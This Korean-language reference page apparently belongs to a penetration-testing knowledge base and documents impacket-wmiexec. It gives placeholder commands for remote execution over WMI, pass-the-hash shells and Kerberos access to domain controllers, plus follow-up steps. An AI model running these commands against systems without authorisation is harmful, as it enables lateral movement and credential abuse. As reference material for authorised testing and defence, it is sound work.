---
tags:
  - 환경/windows
  - 서비스/wmi
  - 기능/원격실행
실행환경: ["Linux"]
필요권한: ["관리자 권한"]
필요조건: ["SMB 인증 정보 또는 hash", "WMI/DCOM 접근 가능"]
결과: ["세션", "명령 실행"]
---

# impacket-wmiexec

## 도구 개요

`impacket-wmiexec`는 Linux에서 Windows Management Instrumentation(WMI)과 DCOM을 통해 원격 명령이나 반대화형 shell을 실행한다. 임시 서비스를 만드는 `impacket-psexec`와 달리 WMI 기반 원격 실행이 적합한 환경에서 사용한다.

## 필요한 입력과 실행 환경

- 실행 위치: 대상 WMI/DCOM/RPC와 SMB에 접근 가능한 Linux 호스트
- 필요한 입력: 대상 주소와 관리자 credential 또는 NTLM hash
- 대상 조건: WMI/DCOM 원격 접근, TCP/135와 동적 RPC/SMB 경로, 원격 관리 권한이 필요하다.
- `<TARGET>`은 Kerberos일 때 SPN과 일치하는 FQDN, `<DOMAIN>/<USER>` 또는 `LM:NT`는 credential namespace다. WMI process 생성과 stdout 회수는 다른 결과이며 인증 성공만으로 명령 실행을 단정하지 않는다.


## 표준 사용법

`<TARGET_FQDN>`은 Kerberos SPN과 맞는 WMI/DCOM endpoint, `<DOMAIN>/<USER>`·password 또는 `LM:NT`는 requester credential이다. remote process creation, command stdout, SMB output-file retrieval은 separate outputs이며 credential authentication만으로 실행 결과를 확정하지 않는다.

```bash
impacket-wmiexec <domain>/<user>:<password>@<target> [command]
```

## 대표 예시

### credential로 단일 명령 실행

```bash
impacket-wmiexec <DOMAIN>/<USER>:'<PASSWORD>'@<TARGET> 'hostname'
```

### Kerberos ticket으로 내부 DC 접속

```bash
proxychains impacket-wmiexec <DC_HOST> -k
```

### Pass the Hash로 WMI shell 획득

```bash
impacket-wmiexec administrator@<TARGET> -hashes :<NTLM_HASH>
```

## 주요 옵션

| 옵션 | 설명 |
| --- | --- |
| `-hashes` | NTLM hash 인증 |
| `-k` | Kerberos 인증 사용 |
| `-no-pass` | 비밀번호 없이 ccache 사용 |
| `-dc-ip` | 도메인 컨트롤러 IP 지정 |
| `-shell-type` | cmd 또는 PowerShell shell 타입 선택 |
| `-codec` | 출력 인코딩 지정 |


## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| command output 또는 shell 획득 | Windows 원격 명령 실행 성공 | `whoami`, `hostname`, `ipconfig`로 컨텍스트 확인 |
| WMI/DCOM 기반 실행 확인 | 서비스 생성 없이 WMI로 명령 실행 성공 | 실행 계정 권한과 네트워크 접근 범위 확인 |
| `STATUS_ACCESS_DENIED` | 관리자 권한 부족 또는 UAC 제한 | 로컬 관리자 여부, admin share 접근, UAC remote restriction 확인 |
| logon/network 오류 | credential, SMB/RPC/WMI 접근 문제 | 포트, 계정 형식, NTLM/Kerberos, 방화벽 확인 |
| 명령 실행 실패 | WMI/DCOM/RPC 제한 또는 보안 제품 차단 | 135/445 접근성, WMI 서비스, 방화벽, AV/EDR 확인 |
| 출력 없음 | 실행은 됐지만 stdout 회수 실패 | 파일로 출력 저장, 다른 exec 방식, 방화벽 확인 |

## 관련 공격기법

- [[WMI 원격 명령 실행]]
- [[Pass the Hash]]
- [[Pass the Ticket]]
